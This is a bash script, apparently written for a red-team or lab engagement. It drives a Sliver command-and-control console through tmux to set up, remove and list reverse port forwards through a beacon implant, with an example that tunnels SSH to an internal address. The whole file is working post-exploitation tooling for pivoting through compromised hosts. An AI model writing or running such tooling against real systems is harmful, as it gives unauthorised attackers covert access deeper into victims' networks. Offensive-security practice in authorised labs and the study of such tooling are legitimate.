#!/bin/bash
# c2-rportfwd - Reverse port forwarding through beacon
# Usage:
#   c2-rportfwd add <beacon_id> <local_port> <remote_host:remote_port>
#   c2-rportfwd remove <beacon_id> <bind_port>
#   c2-rportfwd list [beacon_id]
#
# Example:
#   c2-rportfwd add <id> 2222 10.13.38.33:22
#     -> connects beacon's 2222 to local port, forwarded to your 10.13.38.33:22
C2="$(dirname "$0")/c2"
ACTION="${1:-list}"
BEACON="${2:-}"
SESSION="sliver"

die() { echo "[!] $*"; exit 1; }

case "$ACTION" in
    add)
        PORT="$3"
        REMOTE="$4"
        [ -z "$BEACON" ] || [ -z "$PORT" ] || [ -z "$REMOTE" ] && \
            die "Usage: c2-rportfwd add <beacon_id> <local_port> <remote_host:remote_port>"
        if ! tmux has-session -t "$SESSION" 2>/dev/null; then
            die "tmux session '$SESSION' not running"
        fi
        echo "[*] Adding rportfwd: 0.0.0.0:$PORT -> $REMOTE"
        tmux send-keys -t "$SESSION" "use $BEACON" Enter ; sleep 2
        tmux send-keys -t "$SESSION" "rportfwd add --bind 0.0.0.0 --bind-port $PORT --remote $REMOTE" Enter
        sleep 3
        echo "[*] Done. Now from another host you can:"
        echo "    ssh -i <key> -p $PORT <beacon_ip>"
        ;;
    remove|rm|del)
        PORT="$3"
        [ -z "$BEACON" ] || [ -z "$PORT" ] && \
            die "Usage: c2-rportfwd remove <beacon_id> <bind_port>"
        if ! tmux has-session -t "$SESSION" 2>/dev/null; then
            die "tmux session '$SESSION' not running"
        fi
        echo "[*] Removing rportfwd on port $PORT..."
        tmux send-keys -t "$SESSION" "use $BEACON" Enter ; sleep 2
        tmux send-keys -t "$SESSION" "rportfwd rm $PORT" Enter
        sleep 2
        echo "[*] Removed"
        ;;
    list|status)
        if ! tmux has-session -t "$SESSION" 2>/dev/null; then
            die "tmux session '$SESSION' not running"
        fi
        if [ -n "$BEACON" ]; then
            tmux send-keys -t "$SESSION" "use $BEACON" Enter ; sleep 2
        fi
        tmux send-keys -t "$SESSION" "rportfwd" Enter
        sleep 2
        tmux capture-pane -t "$SESSION" -p -S -20 \
            | perl -pe 's/\e\[[0-9;]*[a-zA-Z]//g; s/\e\][0-9;]*[^\a]*\a//g; s/\r//g' \
            | grep -v -E '^\s*$|rportfwd|sliver'
        ;;
    *)
        echo "Usage:"
        echo "  c2-rportfwd add <beacon_id> <local_port> <remote_host:remote_port>"
        echo "  c2-rportfwd remove <beacon_id> <bind_port>"
        echo "  c2-rportfwd list [beacon_id]"
        echo ""
        echo "Example: c2-rportfwd add <id> 2222 10.13.38.33:22"
        exit 1
        ;;
esac
